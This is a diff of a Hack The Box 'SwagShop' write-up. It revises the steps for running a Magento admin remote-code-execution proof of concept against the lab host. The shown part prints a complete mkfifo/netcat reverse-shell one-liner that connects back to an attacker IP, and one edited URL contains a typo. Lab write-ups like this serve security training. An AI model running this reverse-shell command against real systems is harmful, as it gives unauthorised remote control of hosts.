@@ -232,7 +232,8 @@ except (mechanize.HTTPError, mechanize.URLError) as e:
     print e.read()
 {% endhighlight %}
 
-For the `install_date` variable, it can be found in `http://swagshop.htb/app/etc/local.xml`. Now lets test it out with a `whoami` command. For the `target` variable, which is the first argument, it is the URL of the admin login page (`http://10.10.10.140.htb/index.php/admin`).
+For the `install_date` variable, it can be found in `http://swagshop.htb/app/etc/local.xml`. Now lets test it out with a `whoami` command. For the `target` variable, which is the first argument, it is the URL of the admin login page (`http://10.10.10.140.htb/index.php/admin`). Note that we cannot use the domain name `swagshop.htb` as we will always be redirected to `10.10.10.140` for some reason.
+
 {% highlight bash %}
 $ python poc.py http://10.10.10.140/index.php/admin "whoami"
 www-data
@@ -246,7 +247,7 @@ listening on [any] 1337 ...
 {% endhighlight %}
 
 {% highlight bash %}
-$ python poc.py http://swagshop.htb/index.php/admin "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/g"
+$ python poc.py http:/10.10.10.140/index.php/admin "rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.XXX.XXX 1337 >/tmp/g"
 {% endhighlight %}
 
 As expected, we caught the reverse shell.
